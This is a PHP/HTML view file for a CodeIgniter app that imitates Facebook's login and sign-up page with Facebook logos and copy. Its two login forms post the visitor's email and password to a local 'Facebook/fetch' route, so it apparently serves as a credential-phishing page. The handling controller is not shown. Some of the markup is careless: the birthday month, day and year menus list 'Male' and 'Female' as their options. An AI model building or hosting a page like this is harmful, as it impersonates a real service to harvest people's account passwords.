<!--BM-41884 -->


<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html>

	<head> <!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

	<!-- jQuery library -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

	<!-- Latest compiled JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

	<link rel="stylesheet" type="text/css" href="css/boot.css">

	</head>

	<body>
	<?php
	$this->load->helper('url');
	?>

		<div class="container-fluid">
			<div class="row row-this">
				<div class="col-md-offset-0 col-md-6 col-sm-offset-3 col-sm-4 col-lg-offset-0 col-lg-6 col-xs-offset-3 col-xs-4">
					<img src="image/fb.png">
				</div>
				<div class="col-md-offset-2 col-md-4 col-lg-offset-2 col-lg-4 hidden-sm hidden-xs visible-md visible-lg">
					<form method="post" action="<?php echo base_url().'/index.php/Facebook/fetch'?>">
						<input type="text" name="email" placeholder="Email">
				
						<input type="password" name="pwd" placeholder="Password" >
						<button type="submit" class="btn btn-primary">Log In</button>
					</form>
				</div>

			</div>

			<div class="row hidden-md hidden-lg visible-sm visible-xs">


				<form id="small" method="post" action="<?php echo base_url().'/index.php/Facebook/fetch'?>">
					<div class=" col-sm-12 col-xs-12 col-email">
						<input type="text" name="email" placeholder="Email" class=
						"form-control">
				
					</div>
					<div class="col-sm-12 col-xs-12 col-pwd">

						<input type="password" name="pwd" placeholder="Password" class=
						"form-control">
					</div>

					<div class=" col-sm-12- col-xs-12 col-btn">

						<button type="submit" class="btn btn-primary" style="width: 100%">Log In</button>
					</div>
				</form>
			</div>
			<div class="row">
				
				<div class="col-md-offset-0 col-md-6 col-lg-offset-0 col-lg-6 hidden-ms hidden-sm visible-md visible-lg">
				<p id="para">Facebook helps you connect and share with<br> the people in your life.</p>
				

				</div>

				<div class="col-md-offset-0 col-md-6 col-lg-offset-0 col-lg-6 hidden-sm hidden-xs">
				<h3><b>Sign Up</b></h3>
				<p id="free">It's free and always will be.</p>
				<hr class="notfoot hidden-ms hidden-sm visible-md visible-lg">

				</div>

			</div>

			<div class="row">

				<div class="col-md-offset-0 col-md-6 col-lg-offset-0 col-lg-6 hidden-ms hidden-sm visible-md visible-lg">
					<img id="image" src="image/fb2.png">


				</div>

				<div class="col-md-offset-0 col-md-6 col-lg-offset-0 col-lg-6">
					<div class="row">
						<div class="col-md-offset-0 col-md-4 col-lg-offset-0 col-lg-4 left hidden-ms hidden-sm visible-md visible-lg">
							<p id="fn">First Name:</p>
							<p id="ln">Last Name:</p>
							<p id="ye">Your Email:</p>
							<p id="re">Re-enter Email:</p>
							<p id="np">New Password:</p>
							<p id="iam">I am:</p>
							<p id="birth">Birthday:</p>

						</div>



								<div class="col-md-8 hidden-ms hidden-sm visible-md visible-lg">
									<input class="input1 form-control" type="text" name="fname"><br>
									<input class="input2 form-control" type="text" name="lname"><br>
									<input class="input3 form-control" type="email" name="email"><br>
									<input class="input4 form-control" type="email" name="remail"><br>
									<input class="input5 form-control" type="password" name="pwd"><br>
									 <select class="gender">
									 <option value="" selected="">Select Sex :</option>
									  <option value="male">Male</option>
									  <option value="female">Female</option>
									  
										</select> <br>
										
														
											<select class="day">
										 	<option value="" selected="">Month :</option>
										  	<option value="male">Male</option>
										  	<option value="female">Female</option>
										  	</select> 

										  	<select class="">
										 	<option value="" selected="">Day :</option>
										  	<option value="male">Male</option>
										  	<option value="female">Female</option>
										  	</select> 
										  	<select class="">
										 	<option value="" selected="">Year :</option>
										  	<option value="male">Male</option>
										  	<option value="female">Female</option>
										  	</select> 
								</div>

							</div>
										<div class="row hidden-sm hidden-xs visible-lg visible-md">

											<div class="col-md-8 wh">
												<p id="why">Why do I need to provide my birthday?</p>
												<button type="button" class="btn btn-md btn1"><b>Sign Up</b></button>
												<hr id="foot" class="hidden-sm hidden-xs">
												<p class="foote"><b class="page">Create a Page</b> for a celebrity, band or business</p>
											</div>

										</div>


						</div>



										<div class"row">
										<div class="col-sm-12- col-xs-12 hidden-md hidden-lg visible-sm visible-xs">
										<button type="button" class="btn btn-md btn2"><b>Sign Up</b></button>
										</div>
										</div>

				</div>
			</div>

	</body>

</html>